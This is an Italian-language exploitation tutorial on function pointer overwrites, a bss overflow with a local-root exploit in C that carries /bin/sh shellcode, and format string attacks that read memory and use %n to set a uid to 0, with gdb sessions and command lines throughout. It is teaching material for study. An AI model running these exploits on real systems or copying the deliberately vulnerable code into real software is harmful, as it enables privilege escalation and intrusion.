+[===-0x11b Sovrascrizione di puntatori a funzione-========================]
+
+
+ Nel C è possibile creare dei puntatori che reindirizzino a codice eseguibile,
+ si tratta di una peculiarità molto usata quando si ha il bisogno di mantenere
+ un alto grado di modularità all'interno del programma, si rivela molto utile
+ soprattutto per la sua dinamicità ed eleganza..
+ 
+ Un puntatore a funzione viene dichiarato nel seguente modo:
+
+ 	ret (*func)(parameters)
+
+ dove ret è il tipo di valore di ritorno della funzione, *func è il nome
+ del puntatore e parameters sono appunto i prametri che richiede la funzione
+ puntata..
+ l'inizializzazione è veramente molto semplice basta porre il nome del puntatore
+ uguale al nome della funzione che si vuole puntare.. esempio:
+
+	int (*fp)(int exit_value);
+	fp = exit;
+
+ chiamando ora fp() il flusso verrà redirectato alla funzione exit() con il parametro
+ exit_value, dunque
+	
+	fp(0); comporterà l'esecuzione di exit(0);
+
+ Nei paragrafi seguenti vedremo come sarà possibile abusare dei puntatori a funzione
+ per redirigere il programma fuori dal normale flusso prestabilito..
+
+
+[===-0x11d PLT & GOT-=====================================================]
+
+ Questi due nomi si riferiscono a due sezioni standard del formato ELF
+ (introdotto in precedenza) e non sono nient'altro che due tabelle, la GOT 
+ (GLobal Offset Table) è una tabella contenente una mappa delle funzioni 
+ utilizzate dall'eseguibile, che collega il simbolo di ogni funzione, 
+ ad un indirizzo in memoria e alle istruzioni su come accederci..
+ un esempio di GOT lo si può vedere effettuando un dump sull'eseguibile 
+ con il comando seguente:
+ 
+	objdump -R nome_eseguibile
+
+ ponendo il caso di avere un semplice programma che scrive Hello World 
+ e successivamente esce, ci troviamo una GOT simile alla seguente:
+
+	root@eviltime:~# objdump -R hel
+
+	hel:     file format elf32-i386
+
+	DYNAMIC RELOCATION RECORDS
+	OFFSET   TYPE              VALUE
+	[...]
+	08049614 R_386_JUMP_SLOT   __libc_start_main
+	08049618 R_386_JUMP_SLOT   printf
+	0804961c R_386_JUMP_SLOT   exit
+ 
+ (Descrizione di PLT)
+
+
+[===-0x11e Analisi via objdump di una call-===============================]
+
+ [...]
+
+
+[===-0x11f Function Pointer Exploitation (heapexp.c)-=====================]
+
+
+ Mettiamo di avere un programma vulnerabile ad un overflow di tipo heap (bss in modo specifico)
+ questo programma genera un numero a random tra 0 e 20 e se l'utente indovina questo numero al 
+ primo tentativo esegue una certa funzione, altrimenti un'altra. Entrambe le call alle due funzioni
+ sono regolate da un unico puntatore..
+
+ /* heapgame.c - vulnerable game */
+
+ #include <stdio.h>
+ #include <errno.h>
+ #include <string.h>
+ 
+ unsigned int random;
+
+ int winner() {
+	printf("you win!\n");
+ 	return 0;
+ }
+ 
+ int check(int number) {
+
+	printf("the randon number is %d... ", random);
+	if(number==random) 
+		return winner();
+	else
+		return loser();
+ }	
+
+ int loser() {
+	printf("you lose!\n");
+	return -1;
+ }
+
+ int main(int argc, char **argv) {
+	static char buffer[20];
+	static int (*func)(int number);
+
+	if(argc<2) exit(0);
+	
+	srand(time(NULL));
+	random = (rand()% 20);
+
+	func = check;
+	strncpy(buffer, argv[1], strlen(argv[1])); // oops!
+
+	return func(atoi(buffer));
+ }
+
+
+ molto bene, il nostro primo obbiettivo sarà deviare il percorso del programma
+ costringendolo a far vincere l'utente anche quando il numero è sbagliato,
+ per fare ciò dovremo provocare un overflow sulla variabile buffer in modo
+ da sovrascrivere il puntatore a funzione 'func' e farlo puntare all'indirizzo
+ della funzione winner();
+
+ Come prima cosa recuperiamo l'indirizzo della funzione winner, controllando
+ i simboli esportati dall'eseguibile con objdump --syms nomefile
+
+	080486b0 g     F .text  0000004b              __libc_csu_fini
+	08048390 g     F .init  00000000              _init
+	08048524 g     F .text  0000001d              winner
+	08048541 g     F .text  0000003e              check
+	00000000       F *UND*  00000010              time@@GLIBC_2.0
+	08048450 g     F .text  00000000              _start
+
+ La funzione winner() è situata all'indirizzo "08048524", dunque?
+ proviamo a vedere cosa succede passando più di 20 caratteri al programma
+ 
+ (gdb) r 12345678901234567890AAAA
+ Starting program: /root/heap2 12345678901234567890AAAA
+ 
+ Program received signal SIGSEGV, Segmentation fault.
+ 0x41414141 in ?? ()
+
+ Il valore del puntatore assume il valore passato dopo i 20 caratteri ovvero "AAAA"
+ e dunque 41414141 in esadecimale, al momento in cui la func() viene chiamata
+ il programma tenta di andare ad eseguire il codice presente alla posizione
+ 0x41414141 e segfaulta..
+ Tutto quello che dobbiamo fare è passare il valore esadecimale della posizione
+ della funzione winner():
+
+	evil@eviltime:~$ ./heap2 12345678901234567890`printf "\x24\x85\x04\x08"`
+	you win!
+
+ perfetto, abbiamo dirottato il programma alla vincita, bypassando quindi il controllo,
+ controllo che in altri casi poteva essere una protezione con password o comunque ben più
+ importante di un banalissimo gioco di statistica..
+
+
+[===-0x11g Heap-based local root exploit example-=========================]
+
+
+ E adesso arriva la parte migliore, creeremo un exploit su misura per redirectare il flusso
+ del programma verso un nostro shellcode, in modo da farci restituire una shell con permessi
+ di root..
+ Per fare questo dovremo utilizzare un indirizzo valido dove copiare il nostro shellcode,
+ purtroppo la variabile buffer è piccola e non possiamo utilizzarla per il nostro scopo,
+ le opzioni sono quindi 2:
+
+	1. caricare lo shellcode in una environment (export SHELLCODE)
+	2. caricare lo shellcode in un argomento passato al programma vulnerabile
+
+ Con la prima nel caso di un exploit remoto non otterremo nulla poichè dovremo
+ caricare lo shellcode nella nostra macchina e non su quella attaccata, sceglieremo
+ quindi la seconda.
+ Forse non ne siete mai stati al corrente, ma gli argomenti passati al programma ANCHE
+ QUELLI NON UTILIZZATI, vengono comunque memorizzati nello stack del processo,
+ vediamo quindi come trovarli:
+
+ Settiamo un breakpoint ad una qualunque funzione all'interno di main
+
+	(gdb) b strncpy
+	Function "strncpy" not defined.
+	Make breakpoint pending on future shared library load? (y or [n]) y
+	Breakpoint 1 (strncpy) pending.
+
+ avviamo il programma passando anche un secondo parametro con un qualunque valore
+ in questo caso PROVA:
+
+	(gdb) r heap2 15 PROVA
+	Starting program: /home/evil/heap2 heap2 15 PROVA
+	Breakpoint 2 at 0x4001ab1a
+	Pending breakpoint "strncpy" resolved
+
+	Breakpoint 2, 0x4001ab1a in strncpy () from /lib/libsafe.so.2
+
+ controlliamo ora il valore di ebp, per sapere dove inizia lo stack del programma
+
+	 (gdb) i r $ebp
+	 ebp            0xbffff5f8       0xbffff5f8
+
+ adesso non ci resta altro che scorrere nella memoria partendo da quell'indirizzo,
+ alla ricerca di qualche stringa..
+
+	(gdb) x/s 0xbffff5f8
+	0xbffff5f8:      "(öÿ¿+\206\004\b¬\230\004\bÍ÷ÿ¿\005"
+	(gdb)
+	0xbffff60a:      ""
+	(gdb)
+	0xbffff60b:      ""
+	[...]
+	0xbffff7b7:      "i686"
+	(gdb)
+	0xbffff7bc:      "/home/evil/heap2"
+	(gdb)
+	0xbffff7cd:      "heap2"
+	(gdb)
+	0xbffff7d3:      "15"
+	(gdb)
+	0xbffff7d6:      "PROVA"
+
+ trovato!, qui abbiamo tutti i parametri passati al programma, argv[0], argv[1] e anche argv[2]
+ del quale il programma non fà uso..
+ Visto che l'unico controllo sul numero di argomenti, nega l'esecuzione del programma solo se
+ i parametri passati sono meno di 2, possiamo proseguire senza alcun problema utilizzando
+ la tecnica che avevamo preparato...
+
+ /* exp2.c - local root heap overflow exploit for the 
+  * function pointer overflow example
+  *
+  */
+
+ #include <stdio.h>
+ #include <stdlib.h>
+ #include <unistd.h>
+ #include <string.h>
+
+ #define SIZE 20		// spazio tra buf e (*func)() nel programma vulnerabile
+ #define PROC "/./heap"		// entire path for the vulnerable program
+
+ char shellcode[] =
+ "\x31\xC9"              /* xor ecx,ecx     */
+ "\x31\xDB"              /* xor ebx,ebx     */
+ "\x6A\x46"              /* push byte 70    */
+ "\x58"                  /* pop eax         */
+ "\xCD\x80"              /* int 80h         */
+ "\x51"                  /* push ecx        */
+ "\x68\x2F\x2F\x73\x68"  /* push 0x68732F2F */
+ "\x68\x2F\x62\x69\x6E"  /* push 0x6E69622F */
+ "\x89\xE3"              /* mov ebx,esp     */
+ "\x51"                  /* push ecx        */
+ "\x53"                  /* push ebx        */
+ "\x89\xE1"              /* mov ecx,esp     */
+ "\x99"                  /* cdq             */
+ "\xB0\x0B"              /* mov al,11       */
+ "\xCD\x80";             /* int 80h         */
+
+ u_long getesp() {
+	__asm__("movl %esp,%eax");		// la funzione ritorna il valore di ESP
+ }
+
+ int main(int argc, char **argv) {
+	int i;
+	u_long shaddr;				// indirizzo dove verrà memorizzato lo shellcode
+	char buffer[SIZE + sizeof(u_long) + 1];	// stringa per argv[1], 4 caratteri per l'indirizzo dello shellcode 
+						// + 1 byte per '\0'
+	if (argc!=2) {
+		printf("usage: %s <offset>\n");
+		exit(0);
+	}
+	
+	shaddr = getesp() + atoi(argv[1]);	// ci muoviamo nella memoria alla ricerca dell'indirizzo di argv[2]
+						// nel programma vulnerabile
+	memset(buffer, 'A', SIZE+sizeof(u_long));
+	buffer[SIZE+sizeof(u_long)] = '\0';
+
+	for(i = 0; i < sizeof(shaddr); i++)
+		buffer[SIZE+i] = ((u_long)shaddr >> (i * 8)) & 255;
+
+	printf("exploiting %s using 0x%x as shellcode address...\n\n", PROC, shaddr);
+	execl(PROC, PROC, buffer, shellcode, NULL);
+	return 0;
+ }
+
+ 
+ L'algoritmo seguente
+
+	for(i = 0; i < sizeof(shaddr); i++)
+		buffer[SIZE+i] = ((u_long)shaddr >> (i * 8)) & 255;
+
+ non fà altro che convertire un indirizzo da big endian a little endian.
+
+ dopo aver compilato proviamo quindi a fare un bruteforce sugli offset con la solita 
+ riga di comando, se tutto è andato bene il bruteforce dovrebbe fermarsi regalandoci
+ una shell con id root
+
+	evil@eviltime:~$ for((i=200;i<2000;i++)) do echo "offset: $i"; ./exp $i; done
+	offset: 200
+	exploiting /./heap using 0xbffff6c0 as shellcode address...
+
+	Illegal instruction
+	offset: 201
+	exploiting /./heap using 0xbffff6c1 as shellcode address...
+
+	Illegal instruction
+	offset: 202
+	exploiting /./heap using 0xbffff6c2 as shellcode address...
+
+	[...]
+
+	offset: 445
+	exploiting /./heap using 0xbffff705 as shellcode address...
+
+	sh-3.1# id
+	uid=0(root) gid=100(users) groups=100(users)
+
+ Perfetto abbiamo ottenuto ciò che ci aspettavamo.. 
+ Ci sono comunque alcune considerazioni da fare, lo stack potrebbe 
+ essere protetto da programmi appositi, e settato come non-eseguibile, 
+ per cui questa tecnica non riuscirebbe con successo. 
+ E' consigliabile inoltre utilizzare l'heap per memorizzare lo shellcode, 
+ per la sua dinamicità, mentre infatti nello stack l'offset deve essere esatto, 
+ nell'heap abbiamo invece un range di errore molto vasto..
+
+ Per memorizzare l'exploit nell'heap, la var shaddr assume il seguente valore
+
+	shaddr = (u_long)sbrk(0) - atoi(argv[1]);
+
+ sbrk() ritorna il valore della prima posizione libera all'interno dell'heap, 
+ e l'uso della sottrazione è dovuto al fatto che, diversamente dallo stack, 
+ l'heap cresce verso il basso..
+ In questo programma siamo impossibilitati a memorizzare lo shellcode nell'heap poichè
+ la variabile 'buffer' all'interno del programma vulnerabile è troppo piccola..
+
+
+[===-0x20 Format string-==================================================]
+
+
+ Questo tipo di vulnerabilità è stata pubblicamente scoperta nella seconda
+ metà del 2000, e permise nei primi mesi seguenti di scoprire importanti falle
+ di sicurezza in tutti i tipi di programmi, dalle piccole utilità ai più importanti
+ server in circolazione..
+
+
+[===-0x20a Cos'è una format string-=======================================]
+
+
+ Una format string è una stringa di caratteri, contenente dei riferimenti a svariati
+ tipi di dati, che dovranno essere tradotti in un linguaggio comprensibile all'uomo,,
+ La funzione più semplice che conosciamo è la printf()
+
+	printf("il valore di VAR e' = %d\n", var);
+
+ in questo caso la format function è printf() e la format string è 
+
+	"il valore di VAR e' = %d\n" 
+
+ una format string è dunque composta da un testo e da uno o più parametri
+ da convertire in ASCII, questi parametri possono fornirci diversi valori,
+ da semplici numeri, a stringhe di caratteri sino a posizioni di memoria..
+ Tra i più utilizzati abbiamo:
+
+	%d	Ritorna un numero decimale (int)
+	%u	Ritorna un numero decimale positivo (unsigned int)
+	%o	Ritorna un numero ottale (unsigned int)
+	%x	Ritorna un numero esadecimale (unsigned int)
+	%s	Ritorna una stringa di caratteri (char *)
+	%n	Ritorna un numero decimale relativo ai byte
+		nella format string scritti prima della richiesta
+		al parametro
+
+ mentre invece le funzioni più utilizzare che fanno utilizzo di format string 
+ troviamo:
+
+	fprintf()
+	sprintf()
+	snprintf()
+	vfprintf()
+	vprintf()
+	vsprintf()
+	vsnprintf()
+	syslog()
+	perror()
+
+
+[===-0x20b Errori di programmazione-======================================]
+
+
+ Prendendo come esempio la funzione printf(), possiamo classificare 2 diversi
+ errori di programmazione potenzialmente exploitabili..
+
+ 1) l'uso di printf(variabile) piuttosto che printf("%s", variabile)
+ 2) la diseguaglianza numerica tra parametri presenti e variabili associate
+	esempio: printf("%s %s", variabile);
+
+ Nei seguenti paragrafi faremo riferimento al primo caso, utilizzando
+ queste piccolo programma vulnerabile:
+
+ /* fmt_bug example - most common type of format string bug */
+
+ #include <stdio.h>
+
+ int main(int argc, char **argv) {
+	char string[256];
+	
+	if (argc!=2)
+		return -1;
+
+	strncpy(string, argv[1], sizeof(string));
+
+	printf("corretto: %s\n", string);
+	printf("exploittabile: ");
+	printf(string);
+	printf("\n");
+
+	return 0;
+ }
+
+
+[===-0x21a Lettura arbitraria di un indirizzo di memoria-=================]
+
+
+ Basandoci sull'esempio fatto in precedenza (fmtbug.c) vedremo come servirci di
+ questo tipo di errore per leggere il contenuto di indirizzi di memoria a 
+ nostro piacimento..
+
+ Se proviamo a far partire il programma specificando come primo argomento dei
+ semplici caratteri ascii (lettere, numeri ecc..) entrambi i metodi risponderanno
+ in modo corretto:
+
+	root@eviltime:~# ./fmt prova
+	corretto: prova
+	exploittabile: prova
+
+ il problema si presenta invece quando proviamo ad inserire nella stringa, dei caratteri
+ speciali come ad esempio il segno di percentuale %. nel primo caso infatti il problema
+ non sussisterà poichè verrà interpretato come carattere ascii, nel secondo caso invece
+ tutto quello che passiamo và a costituire la reale format string che verrà dunque
+ interpretata seguendo le regole del caso, dove il segno di percentuale è un carattere
+ speciale e non un carattere come altri..
+
+	root@eviltime:~# ./fmt %s%s%s
+	corretto: %s%s%s
+	Segmentation fault
+
+ il programma con il secondo metodo tenta di leggere una stringa su un indirizzo di memoria 
+ non specificato, e il risultato è una violazione della segmentazione..
+ Possiamo ad esempio servirci del parametro %x per esplorare lo stack della funzione:
+
+	root@eviltime:~# ./fmt AAAABBBBCCCCDDDD[`perl -e 'print "-0x%08x"x20'`]
+	corretto: AAAABBBBCCCCDDDD[-0x%08x-0x%08x-0x%08x-0x%08x-0x%08x-0x%08x-0x%08x- [...]]
+	exploittabile: AAAABBBBCCCCDDDD[-0xbffff3f0-0x00000100-0x00000000-0x000007a3-0x40046e3a-0x40041b64-
+	0x40039374-0x00000005-0x40018378-0x400183b0-0x0177ff8e-0x41414141-0x42424242-0x43434343-0x44444444-
+	0x78302d5b-0x78383025-0x2578302d-0x2d783830-0x30257830]
+
+ Grazie a questo viaggio nello stack offerto dal format string bug in printf() possiamo 
+ localizzare la posizione della stringa passata come argomento.. che inizia proprio con le 4 A
+ "0x41414141", è dunque ovvio che se al posto di una serie di lettere mettessimo un indirizzo
+ in memoria specifico e lo printassimo con %s, otterremo il contenuto di tale indirizzo.. proviamo..
+
+ sappiamo che nel nostro caso abbiamo bisogno di saltare 11 indirizzi prima di trovare la 
+ stringa contenuta nel parametro passato al programma, il nostro comando sarà strutturato
+ dunque in questo modo..
+
+	./fmt INDIRIZZO%x(per 11 volte)%s
+
+ e l'output sarà la stringa contenuta nell'indirizzo specificato.. procuriamoci dunque l'indirizzo
+ di una stringa valida, come ad esempio la stringa passata alla prima printf().
+
+	0x0804842e <main+90>:   push   $0x8048584
+	0x08048433 <main+95>:   call   0x80482d8 <printf@plt>
+
+ Facciamo partire il programma specificando l'indirizzo della stringa che vogliamo printare
+ (0x8048584) indicato in little endian e dunque al contrario..
+
+	root@eviltime:~# ./fmt `printf "\x84\x85\x04\x08"`%x%x%x%x%x%x%x%x%x%x%x%s
+	corretto:%x%x%x%x%x%x%x%x%x%x%x%s
+	exploittabile:bffff48010007a340046e3a40041b6440039374540018378400183b0177ff8ecorretto: %s
+
+ Come vedete l'ultima parte scritta a video dalla printf() exploittabile è proprio la format string
+ della prima printf() del programma..
+
+
+[===-0x21b Scrittura arbitraria su un indirizzo di memoria-===============]
+
+
+ La stessa tecnica spiegata per leggere il contenuto di certi indirizzi di memoria, può
+ essere utilizzata per scrivere e sovrascriverne altri.
+
+ Il nostro obbiettivo sarà ora quello di fare in modo di bypassare un semplicissimo
+ controllo sui permessi di chi esegue il programma, facendo credere al programma che siamo root
+ sul sistema, quando in realtà siamo loggati come semplici user..
+
+ /* fmt_bug example 2 - most common type of format string bug */
+
+ #include <stdio.h>
+ #include <unistd.h>
+ #include <sys/types.h>
+
+ int main(int argc, char **argv) {
+	char string[256];
+	uid_t user;
+	
+	if (argc!=2)
+		return -1;
+	user = getuid();
+
+	strncpy(string, argv[1], sizeof(string));
+
+	printf("corretto: %s\n", string);
+	printf("exploittabile: ");
+	printf(string);
+	printf("\n");
+
+	printf("user info: uid=%d", user);
+	return 0;
+ }
+
+ proviamo a compilarlo e ad eseguirlo:
+
+	corretto: prova
+	exploittabile: prova
+	user info: uid=0
+	root@eviltime:~# su evil
+	evil@eviltime:/root$ ./fmt2 prova
+	corretto: prova
+	exploittabile: prova
+	user info: uid=1000
+
+ una volta accertati che il programma funziona correttamente, possiamo passare all'exploiting..
+ In precedenza abbiamo parlato del parametro %n, questo parametro scrive sulla variabile associata
+ il numero di byte scritti prima del suo riferimento.. dunque una chiamata a printf() come questa
+
+        int val;
+        printf("stringa di prova %n", &val);
+
+ assegnerà alla variabile "val" il valore decimale "17" poichè sono i caratteri che sono
+ stati scritti nella prima printf() prima di chiamare %n..
+ Quello che serve a noi, è la locazione di memoria contenente il valore della variabile
+ 'user', una volta trovata, potremo sovrascriverne il contenuto con quello che ci interessa..
+
+ Metodo 1 usiamo gdb
+
+	evil@eviltime:/root$ gdb ./fmt2
+	(gdb) r prova
+	Starting program: /root/fmt2 prova
+	corretto: prova
+	exploittabile: prova
+	user info: uid=1000
+
+ A noi serve sapere l'indirizzo dove verrà salvato il valore di ritorno della funzione
+ getuid(), poichè quell'indirizzo è proprio l'indirizzo della variabile che andremo
+ a sovrascrivere (uid_t user)
+ disassembliando la funzione main, troviamo queste 2 righe
+
+	0x08048448 <main+52>:   call   0x8048318 <getuid@plt>
+	0x0804844d <main+57>:   mov    %eax,0xfffffef4(%ebp)
+
+ con la prima chiamiamo la funzione e con la seconda salviamo l'indirizzo
+ di ritorno in 0xfffffef4(%ebp), dunque per calcolare la posizione reale della variabile 
+ uid_t user bisogna fare il complemento a 2 di 0xfffffef4.
+
+ Il complemento a 2 è il metodo utilizzato dal processore per la rappresentazione
+ dei numeri negativi, prendiamo dunque 0xfffffef4 e trasformiamolo in binario:
+
+	FF FF FE F4 = 11111111-11111111-11111110-11110100
+
+ effettuiamo uno XOR sul numero binario trovato (invertiamo il valore dei numeri,
+ 1 = 0 e 0 = 1):
+
+	00000000-00000000-00000001-00001011
+	dunque:
+	0000000100001011
+
+ e infine aggiungiamo 1 al valore trovato:
+
+	0000000100001011 + 1 = 0000000100001100
+
+ Il risultato và quindi convertito in decimale e contato come numero negativo,
+ ora sappiamo dunque che la nostra variabile si trova a $ebp-268.
+ Testiamo la veridicità del calcolo andando a controllare:
+
+	(gdb) b printf
+	Breakpoint 1 at 0x4007a8b3
+	(gdb) r prova
+	Starting program: /root/fmt2 prova
+	Error in re-setting breakpoint 1:
+	Function "printf" not defined.
+
+	Breakpoint 1, 0x4007a8b3 in printf () from /lib/libc.so.6
+	(gdb) s
+	Single stepping until exit from function printf,
+	which has no line number information.
+	corretto: prova
+	0x08048486 in main ()
+	(gdb) x/d $ebp-268
+	0xbffff53c:     1000
+	(gdb)   
+
+ Ed infatti alla posizione $ebp-268 abbiamo il valore 1000 ovvero il contenuto
+ della variabile user dopo la chiamata a getuid().
+
+ Praticando l'attacco format string bug sull'eseguibile, specificando come
+ indirizzo sul quale scrivere il risultato del parametro %n, dovremo vedere a video
+ un valore diverso da 1000:
+
+ UPS! segmentation fault?
+ proviamo invece a dichiarare la variabile 'user' nell'heap, "static int user;"
+ e osserviamo se è effettivamente cambiato qualcosa:
+
+	0x08048448 <main+52>:   call   0x8048318 <getuid@plt>
+	0x0804844d <main+57>:   mov    %eax,0x8049738
+
+	(gdb) x/d 0x08049738
+	0x8049738 <user.0>:     1000
+
+	evil@eviltime:/root$ ./new `printf "\x38\x97\x04\x08"`%x%x%x%x%x%x%x%x%x%x%x%n
+	corretto: %x%x%x%x%x%x%x%x%x%x%x%n
+	exploittabile: bffff530100804844d7a340046e3a40041b6440039374540018378400183b0177ff8e
+	user info: uid=73
+	evil@eviltime:/root$      
+
+ ohoho è arrivato babbo natale a quanto sembra :)
+
+ [...] ?
+
+ resta un problema, noi vogliamo che "uid" assuma il valore 0, e per via logica 
+ non riusciremo mai a scrivere 0 in quell'indirizzo, perchè prima di %n abbiamo 
+ bisogno di utilizzare operatori con output in byte sempre > 0 (%d %i %u o %x)
+ per spostarci nello stack sino a raggiungere l'indirizzo da associare all'out di
+ %n...
+
+ allora tenendo conto che siamo nell'heap, sappiamo che un indirizzo di memoria è
+ composto da 4 "caselle" di 8 bit l'una: 
+ per 0x08049738 avremo questo scenario:
+
+	[0x08049738][0x08049739][0x08049740][0x08049741]
+
+ se noi dovessimo dunque scrivere su 08049738 il numero 5, avremo il suo valore
+ in hex 32bit ovvero
+
+	0x00000005
+ 
+ organizzato in memoria nel seguente modo:
+
+	0x08049738 = 05
+	0x08049739 = 00
+	0x08049740 = 00
+	0x08049741 = 00
+
+ Il valore di ritorno di getuid(), ovviamente, non sarà mai così grande
+ da scrivere un numero di 32 bit, ci troveremo dunque, sempre nella condizione
+ in cui 0x08049740 e 0x08049741 sono uguali a 0..
+ Possiamo osservare che anche nel primo caso dove abbiamo ottenuto uid=73 
+ (0x00000049 in esadecimale) avevamo i primi 2 byte uguali a 00, contando
+ dunque sul fatto che i primi 2 byte della variabile "user" sono sempre 0x0000
+ ci basterà partire a scrivere da 2 byte sotto a 0x08049738 in modo che il valore
+ 0x00000049 venga scritto partendo da 0x08049738.. otterremo così lo scenario
+ desiderato:
+
+ 
+	0x08049736 = 48 // locazione non utilizzata da nessuna variabile
+	0x08049737 = 00
+	0x08049738 = 00 // inizio variabile user
+	0x08049739 = 00
+	0x08049740 = 00 // byte sempre a 0
+	0x08049741 = 00 // byte sempre a 0
+
+
+ così facendo, andremo a scrivere il valore 0x00000000 all'interno della 
+ variabile user... comproviamo:
+
+	evil@eviltime:/root$ ./new `printf "\x36\x97\x04\x08"`%x%x%x%x%x%x%x%x%x%x%x%n
+	corretto: %x%x%x%x%x%x%x%x%x%x%x%n
+	exploittabile: bffff530100804844d7a340046e3a40041b6440039374540018378400183b0177ff8e
+	user info: uid=0
+
+ Funziona perfettamente.. abbiamo appena bypassato un controllo sui permessi 
+ da parte di un programma vulnerabile ai format string bug.
+
